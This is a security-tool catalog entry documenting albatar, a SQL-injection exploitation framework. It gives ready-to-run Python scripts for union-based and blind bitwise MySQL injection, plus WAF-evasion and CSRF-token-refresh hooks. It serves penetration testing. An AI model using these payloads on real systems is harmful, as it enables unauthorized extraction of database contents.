---
name: "albatar"
categories:
  - blackarch-webapp
version: "0.1.r11.gd500657"
homepage: "https://github.com/lanjelot/albatar"
packaged-by: [blackarch]
blackarch-builddate: "2026-02-03"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "lanjelot/albatar"
github-stars: 139
github-pushed: "2025-01-24"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# albatar

> SQL-injection exploitation framework where each injection point is a short Python script you write.

## What it's for

albatar exploits SQL injections that generic tools handle badly: you describe the injection in a small Python script (a requester that issues requests, a payload template, and a product/technique class), then drive data extraction with sqlmap-like options (`--dbs`, `-D <db> --tables`, `-b`). It does not detect injections — you point it at a request you already control — and it supports MySQL, MSSQL, PostgreSQL and Oracle with union, error, boolean/bitwise and time-based techniques. Because every injection is code, payloads can be mangled per request (WAF evasion) and requesters subclassed (e.g. to fetch CSRF tokens). On packaged installs the framework lives in `/usr/share/albatar/` with no launcher: put that directory on `PYTHONPATH` and run your script with Python 3 (older packaging depended on Python 2). Runnable examples ship in `/usr/share/albatar/demo.py`.

## Typical use cases

### Exploit a union-based injection

```python
# poc.py - union-based MySQL injection in a GET parameter
from albatar import *
import re

def extract_results(headers, body, time):
    return re.findall(':ABC:(.+?):ABC:', body, re.S)

def mysql_union():
    def make_requester():
        return Requester_HTTP(
            url = 'http://target.example.com/artists.php?artist=${injection}',
            method = 'GET',
            headers = ['User-Agent: Mozilla/5.0'],
            response_processor = extract_results,
        )
    template = '-1 union all select null,null,concat(0x3a4142433a,X,0x3a4142433a) from ${query}-- '
    return Method_union(make_requester, template)

sqli = MySQL_Inband(mysql_union())
for r in sqli.exploit():
    print(r)
```

```
PYTHONPATH=/usr/share/albatar python3 poc.py -D appdb --tables
```

Outcome: albatar runs the extraction — each query is wrapped in your template, sent through the requester, and parsed by `response_processor` — and prints the retrieved rows (here the tables of `appdb`); use `--dbs` to list databases or `-b` for the banner.

### Exploit a blind boolean-based injection

```python
# poc.py - boolean/bitwise MySQL injection with a response-grep oracle
from albatar import *

def test_state_grep(headers, body, time):
    return 'Welcome back' in body

def mysql_boolean():
    def make_requester():
        return Requester_HTTP(
            url = 'http://target.example.com/listproducts.php?cat=${injection}',
            method = 'GET',
            headers = ['User-Agent: Mozilla/5.0'],
            response_processor = test_state_grep,
        )
    template = '1 and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}'
    return Method_bitwise(make_requester, template, confirm_char=True)

sqli = MySQL_Blind(mysql_boolean())
for r in sqli.exploit():
    print(r)
```

```
PYTHONPATH=/usr/share/albatar python3 poc.py -b
```

Outcome: each character of the query result is recovered bitwise through the true/false page-state oracle; `-b` (banner) doubles as a connectivity smoke test.

### Adapt payloads for WAFs and CSRF tokens

```python
# mangle every payload before it is sent (pass to Requester_HTTP):
Requester_HTTP(..., tamper_payload = my_encoder)

# or subclass the requester to refresh a per-request token:
class Requester_CSRF(Requester_HTTP_requests):
    def test(self, payload):
        r = self.session.get('http://target.example.com/login.php')
        token = re.search("name='user_token' value='([^']+)'", r.text).group(1)
        self.http_opts[2] = self.http_opts[2].replace('_CSRF_', token)
        return super(Requester_CSRF, self).test(payload)
```

Outcome: `tamper_payload` rewrites each outgoing payload (encoding, checksums, casing) so filtered injections still parse server-side, and the subclassed requester fetches a fresh CSRF token before every shot — the two hooks that make albatar work where stock payload tools fail.

No corpus evidence — derived from upstream documentation (README examples; packaged framework in /usr/share/albatar/).
